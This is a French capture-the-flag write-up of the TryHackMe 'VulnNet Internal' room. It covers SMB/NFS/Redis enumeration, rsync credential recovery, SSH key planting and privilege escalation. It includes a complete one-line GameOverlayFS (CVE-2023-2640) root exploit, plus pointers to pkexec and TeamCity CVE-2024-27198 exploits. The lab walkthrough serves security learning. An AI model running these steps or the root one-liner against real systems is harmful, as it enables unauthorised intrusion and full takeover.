---
title: VulnNet Internal - TryHackMe(Easy)
date: 2024-05-16 21:51:38 +0000
description: VulnNet Entertainment est une entreprise qui apprend de ses erreurs. Elle s'est rapidement rendu compte qu'elle ne pouvait pas créer une application web correctement sécurisée et a donc abandonné cette idée. Au lieu de cela, elle a décidé de mettre en place des services internes à des fins professionnelles. Comme d'habitude, vous êtes chargé d'effectuer un test de pénétration de leur réseau et de rendre compte de vos conclusions.
categories: [TryHackMe]
tags: [THM, CTFs, Hacking]
image:
    path: https://i.ibb.co/tm8Nvnp/Copie-de-Copie-de-Manager.png
---


- **[The Best Academy to Learn Hacking](https://referral.hackthebox.com/mz6xj5g)**.
- **[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.


## Reconnaissance
Pour commencer nous lançons un rapide scan nmap initial pour voir quels ports sont ouverts.

```sh
└─# rustscan --ulimit 5000 -b 1000 -n -a 10.10.220.246
Host is up, received timestamp-reply ttl 61 (0.65s latency).
Scanned at 2024-05-17 15:42:32 EDT for 1s

PORT    STATE SERVICE     REASON
22/tcp  open  ssh         syn-ack ttl 61
111/tcp open  rpcbind     syn-ack ttl 61
139/tcp open  netbios-ssn syn-ack ttl 61
```

Nous utilisons `enum4linux` pour obtenir des informations détaillées.

```sh
└─# enum4linux -a 10.10.220.246
```

[![enum4linux](https://i.ibb.co/X8Tmryb/sh.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}


Ensuite, nous accédons au partage de `Shares`.

```sh
└─# smbclient //10.10.220.246/shares -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3278712 blocks available
smb: \> cd data
smb: \data\> dir
  .                                   D        0  Tue Feb  2 04:27:33 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  data.txt                            N       48  Tue Feb  2 04:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 04:27:33 2021


```

- Pour le port `111` j'utilise l'outil `showmount` pour trouver des informations sur le server NFS
```sh
─# showmount -e 10.10.220.246
Export list for 10.10.220.246:
/opt/conf *
```
Ok donc la je vais monter ce partage NFS que je viens de trouver.

```sh
└─# mount -o nolock 10.10.220.246:/opt/conf mnt 
# ls mnt 
hp  init  opt  profile.d  redis  vim  wildmidi
                                                                                                                                     
┌──(root㉿bloman)-[/home/bloman/CTFs/TryHackMe]
└─# ls mnt/redis
redis.conf
```

Nous trouvons une configuration `redis.conf` contenant un mot de passe. 

```sh
#
# 2) if slave-serve-stale-data is set to 'no' the slave will reply with
#    an error "SYNC with master in progress" to all the kind of commands
#    but to INFO and SLAVEOF.
#
slave-serve-stale-data yes
requirepass "B65Hx562F@ggAZ@F"
```

Nous vérifions si le service `Redis` est ouvert avec `netcat`.
```sh
─# nc -nv 10.10.220.246 6379
(UNKNOWN) [10.10.220.246] 6379 (redis) open
```

Maintenant je vais utiliser l'outil `redis-cli` pour m'y connecter

```sh
─# redis-cli -h 10.10.220.246 --pass 'B65Hx562F@ggAZ@F'
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.220.246:6379> INFO
# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:9435c3c2879311f3
redis_mode:standalone
os:Linux 4.15.0-135-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:7.4.0
process_id:489
run_id:94d8fdcc6c56026d36bd87180f925f9ca616ba31
tcp_port:6379
uptime_in_seconds:1653
uptime_in_days:0
hz:10
lru_clock:4700236
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
```

Je vais verifier l'emplacement des données de Redis sur ce Server.

```sh
10.10.220.246:6379> config get dir
1) "dir"
2) "/var/lib/redis"
```

Nous utilisons les commandes `Redis` pour trouver et lire les clés internes. j'ai laisser le lien dans la Reference

```sh
10.10.220.246:6379> KEYS *
1) "int"
2) "tmp"
3) "internal flag"
4) "authlist"
5) "marketlist"
(0.65s)
10.10.220.246:6379> 
10.10.220.246:6379> GET "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"
```
Detail de ces commandes :
- J'ai utiliser le parametre `KEYS *`  pour Trouver toutes les clés disponible.
- Ensuite le `GET keyname` pour lire le key

```sh
10.10.220.246:6379> LRANGE marketlist 1 3
1) "Penetration Testing"
2) "Programming"
3) "Data Analysis"
(0.65s)
10.10.220.246:6379> 
10.10.220.246:6379> LRANGE authlist 1 3
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
```

- Ici j'utilise `LRANGE key start stop` pour Obtenir une plage d'éléments d'une liste

Je viens d'avoir un base64, donc je le decode dans le Terminal
```sh
# echo $base| base64 -d      
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
                                                                                   
```
on me renvoi dans un `rsync` et je vais utiliser l'outil `rsync` pour me connecter

```sh
# nc -nv 10.10.220.246 873 
(UNKNOWN) [10.10.220.246] 873 (rsync) open
@RSYNCD: 31.0
```

Nous utilisons `rsync` pour accéder aux fichiers.

```sh
# rsync --list-only rsync://rsync-connect@10.10.220.246/files
Password: 
drwxr-xr-x          4,096 2021/02/01 07:51:14 .
drwxr-xr-x          4,096 2021/02/06 07:49:29 sys-internal
drwxrwxr-x          4,096 2021/02/06 06:43:14 sys-internal/.ssh
drwx------          4,096 2021/02/02 06:16:16 sys-internal/.thumbnails
drwx------          4,096 2021/02/02 06:16:16 sys-internal/.thumbnails/large
drwx------          4,096 2021/02/02 06:16:18 sys-internal/.thumbnails/normal
-rw-------          8,437 2021/02/02 06:16:17 sys-internal/.thumbnails/normal/2b53c68a980e4c943d2853db2510acf6.png
-rw-------          6,345 2021/02/02 06:16:18 sys-internal/.thumbnails/normal/473aeca0657907b953403884c53d865c.png
-rw-------            978 2021/02/02 06:16:18 sys-internal/.thumbnails/normal/539380d1cb60fcd744fd5094d314fdc1.png
drwx------          4,096 2021/02/01 07:53:21 sys-internal/Desktop
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Documents
drwxr-xr-x          4,096 2021/02/01 08:46:46 sys-internal/Downloads
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Music
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Pictures
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Public
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Templates
drwxr-xr-x          4,096 2021/02/01 07:53:22 sys-internal/Videos

sent 185 bytes  received 76,450 bytes  5,285.17 bytes/sec
total size is 41,708,382  speedup is 544.25

```

Ensuite, Nous synchronisons notre clé SSH avec le répertoire ``.ssh ``distant.

```sh
└─# cat /root/.ssh/id_rsa.pub > authorized_keys 
─# rsync authorized_keys rsync://rsync-connect@10.10.220.246/files/sys-internal/.ssh/
Password: 
```

je verifie pour voir si la cle ssh a ete bien mise en place

```sh
─# rsync --list-only rsync://rsync-connect@10.10.220.246/files/sys-internal/.ssh/
Password: 
drwxrwxr-x          4,096 2024/05/17 16:41:05 .
-rw-r--r--             22 2024/05/17 16:41:05 authorized_keys
```


[![ssh keys](https://i.ibb.co/ckqX6Zb/success.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}


## Privilege Escalation
Pour aborder le Privilege Escalation, je vais explorer trois méthodes différentes sur cette machine Ubuntu `4.15.0` avec le système d'exploitation Ubuntu 18.04 LTS (Bionic Beaver).


### Méthode 1: Exploitation de GameOverlayFs(CVE-2023-2640)
Un système est susceptible d'être vulnérable a cette vulnerabilite si la version du noyau est inférieure à `6.2`. Alors que notre Machine est `4.15.0-135-generic` donc exploitable.

Cette vulnérabilité affecte exclusivement les systèmes basés sur Linux. Le moyen le plus simple de vérifier si votre système est vulnérable est de voir quelle version du noyau Linux il utilise en exécutant la commande `uname -r`.

Tout d'abord je vais verifier si la version  est inferieur a `6.2`

```sh
sys-internal@vulnnet-internal:/home$ uname -r
4.15.0-135-generic
```

On a une version `4.15` donc vulnerable alors je vais essayer de l'exploiter
- Pour cela, je me rends dans le `/tmp` et j'execute

```sh
sys-internal@vulnnet-internal:~$ cd /tmp
sys-internal@vulnnet-internal:/tmp$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

Cela me permet d'obtenir un shell en tant que `root`.

```sh
root@vulnnet-internal:/tmp# id
uid=0(root) gid=1000(sys-internal) groups=1000(sys-internal),24(cdrom)
root@vulnnet-internal:/tmp# whoami
root
root@vulnnet-internal:/tmp# ls /root
root.txt
root@vulnnet-internal:/tmp# cat /root/root.txt
THM{e8996faea46df09dba5676dd271c60bd}
```

### Méthode 2: Exploitation de pkexec(SUID)
En regardant Dans les `SUID`, il y a `pkexec`. 

[![pkexec](https://i.ibb.co/gvKGxh9/pk.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}

- Pour l'exploiter J'utilise un script Python3 disponible sur GitHub pour l'exploiter 

[![exploit pkexec](https://i.ibb.co/270b07D/explo.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}

### Méthode 3: Exploitation de TeamCity
Enfin, je vais explorer l'exploitation d'un serveur TeamCity. En utilisant un exploit pour la vulnérabilité **CVE-2024-27198** qui permet de contourner l'authentification sur TeamCity, j'obtiens des privilèges de super utilisateur en executant des commandes dans le serveur TeamCity.

Pour commencer, je vérifie les ports en cours d'exécution en arrière-plan sur la machine en utilisant la commande `ss -tupln`. J'identifie un port ouvert, le port `8111`.

[![TeamCity](https://i.ibb.co/85CSfP9/811.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}

En recherchant sur Google, je confirme que ce port est utilisé par un serveur **TeamCity**

[![TeamCity](https://i.ibb.co/3C4RJY5/teamcity.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}

À partir de là, je configure le port forwarding pour accéder au serveur **TeamCity** depuis ma machine locale en utilisant la commande SSH suivante : 
```sh
└─# ssh -L 8111:127.0.0.1:8111 sys-internal@10.10.245.63
```

[![Port Forward](https://i.ibb.co/Cw5f3Bn/fwd.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}

Cela crée une liaison locale du port `811`1 de ma machine vers le port `8111` du serveur distant. Après avoir établi cette connexion, je peux accéder au serveur TeamCity depuis mon navigateur en utilisant l'adresse `127.0.0.1:8111`.

[![Login](https://i.ibb.co/ZVhGRRm/Teamcity.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}

On a une page de login sans avoir des identifiants et mot de passe. Donc la ce que je voudrais est de Contourner cette page et avoir les privileges de `Super User`

>>**NOTE**: En février 2024, l'équipe de recherche de Rapid7 a identifié deux nouvelles vulnérabilités affectant le serveur `JetBrains TeamCity CI/CD` dont le **CVE-2024-27198** qui est une vulnérabilité de contournement(Bypass) d'authentification dans le composant web de TeamCity qui provient d'un problème de chemin alternatif (CWE-288) et a un score CVSS de base de `9.8` (Critique).
>{: .prompt-info }

- Pour Contourner cette page de Login, je vais utiliser [cet exploit](https://github.com/Chocapikk/CVE-2024-27198) disponible sur Github

[![Poc](https://i.ibb.co/njFDrRv/exploit.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}

En lançant l'exploit, un utilisateur est créé avec les identifiants suivants :

- **Username**: d9zkck4m
- **Password**: 5FycViGMlO
Ensuite, je me connecte avec ces identifiants.


[![Started](https://i.ibb.co/DY96QBM/get.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}

### Obtention d'un RCE en tant que Root sur TeamCity
Pour obtenir un **RCE** (Remote Code Execution) en tant que `root`sur TeamCity, je me suis appuyé sur un article intéressant de TeamCity qui explique comment exécuter des scripts en ligne de commande sur la plateforme.

[![Hacked TeamCity](https://i.ibb.co/hHDrgrW/hacked-Team.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}

Dans l'interface de TeamCity, je suis le processus indiqué dans l'article. Après avoir créé un nouveau projet, je passe à l'étape de configuration des étapes de construction.

[![Build TeamCity](https://i.ibb.co/bBS256f/build.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}

Dans la configuration de l'étape de construction, je sélectionne l'option pour exécuter un script en ligne de commande. 

[![Build Step](https://i.ibb.co/5n9bvnB/build-step.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}

Lorsqu'on me demande de fournir un script, j'insère un script malveillant pour obtenir un shell root sur la machine.

[![Shell](https://i.ibb.co/sqgMWz0/shell.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}

Après avoir soumis le script et lancé le projet, je clique sur **RUN** pour démarrer l'exécution du script malveillant.

[![Run](https://i.ibb.co/L1rkJth/run.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}

Une fois le script exécuté avec succès, je reçois un shell en local en tant que `root`, ce qui me donne un RCE complet sur la machine.

[![root](https://i.ibb.co/w7vk3kM/root.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}

## Ressources supplementaires
Voici quelques ressources supplémentaires qui pourraient vous être utiles :
- [GameOverlayFS](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)
- [Redis All Commands](https://www.javatpoint.com/redis-all-commands)
- [Chocapikk Poc for CVE-2024-27198](https://github.com/Chocapikk/CVE-2024-27198)
- [How to Run Command-Line Scripts in TeamCity](https://www.jetbrains.com/teamcity/tutorials/general/running-command-line-scripts/)
- [Join Us on Discord](https://discord.gg/wBT9wr9ruG).
